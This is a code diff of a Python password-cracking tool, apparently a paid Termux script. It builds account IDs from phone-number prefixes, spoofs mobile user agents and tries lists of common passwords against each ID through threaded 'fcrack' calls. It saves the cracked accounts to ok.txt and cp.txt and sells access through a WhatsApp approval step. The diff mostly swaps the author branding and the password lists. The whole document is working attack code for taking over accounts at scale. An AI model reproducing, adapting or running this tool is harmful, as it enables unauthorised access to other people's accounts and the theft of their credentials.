@@ -40,16 +40,16 @@ ugen=[]
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android 11;'
     b=random.choice(['6','7','8','9','10','11','12'])
-    c='ru-ru; POCO X3 NFC Build/'
+    c='fr-fr; Redmi Note 11 Build/'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.2-gn/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l=' AppleWebKit/537.36 (KHTML, like Gecko) Version'
+    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 #Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
@@ -1096,12 +1096,10 @@ logo = """
 888        888 "88b 
 888        888  888                                                           \033[1;32m XD\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32M FARHAAN BALOCH\033[1;37m
+[•] AUTHOR     : \033[1;32mFK\033[1;37m
 [•] STATUS     : \033[1;32mPAID\033[1;37m
-[•] OWNER      : \033[1;32mFARHAAN\033[1;37m
-[•] GUTHUB     : \033[1;32mFKKHAN780\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 2.1.5 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.0.4 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1109,7 +1107,8 @@ def lines():
 loop = 0
 oks = []
 cps = []
-try:	   print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
+try:
+    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
     proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
     update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
@@ -1119,14 +1118,6 @@ try:	   print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
         os.system('python ali.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
-
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
-
 
 #global functions
 def dynamic(text):
@@ -1161,6 +1152,7 @@ def rehan():
 		print('[•] CHOOSE CORRECT OPTION')
 		time.sleep(2)
 		rehan()
+
 def menu():
 	os.system('clear')
 	print(logo)
@@ -1195,7 +1187,7 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1230,7 +1222,7 @@ def ali_khan():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1252,7 +1244,7 @@ def ali_khan():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khankhan123','khan786786','khan786123','khan123321','khan876321']
+			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1271,7 +1263,7 @@ def malik_baloch():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0328,0316,0308,0306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1293,7 +1285,7 @@ def malik_baloch():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'malik786','malik1786','baloch11234']
+			pwx = [guru,'malik123','malik1122','baloch786']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1306,7 +1298,7 @@ def pubg():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0328,0316,0308,92306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1328,7 +1320,7 @@ def pubg():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'pubgqueen123','pubgking123','pubglover']
+			pwx = [guru,'pubgqueen','pubgking','pubglover']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1341,7 +1333,7 @@ def ff():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0328,0316,0308,92306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1363,7 +1355,7 @@ def ff():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'freefire123','fflover321','ffking321','ffqueen123']
+			pwx = [guru,'freefire','fflover','ffking','ffqueen']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1554,13 +1546,13 @@ def approval():
     else:
       print("YOUR KEY : "+id)
       print('\33[1;37m----------------------------------------------')
-      print("\33[1;32m Note FREE LENE WALE NAA AAYE :") 
+      print("\33[1;32m Note this tool is paid :") 
       print("\33[1;37m----------------------------------------------")
       print("\33[1;37mTOOL IS PAID  YOU HAVE TO\nGET APPROVAL FIRST.")
       print('\33[1;37m----------------------------------------------')
-      print ('IF U  WANT FREE TO BUY PLS DONT PRESS ENTER')
+      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Farhaan%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923062422672?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923062422672?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
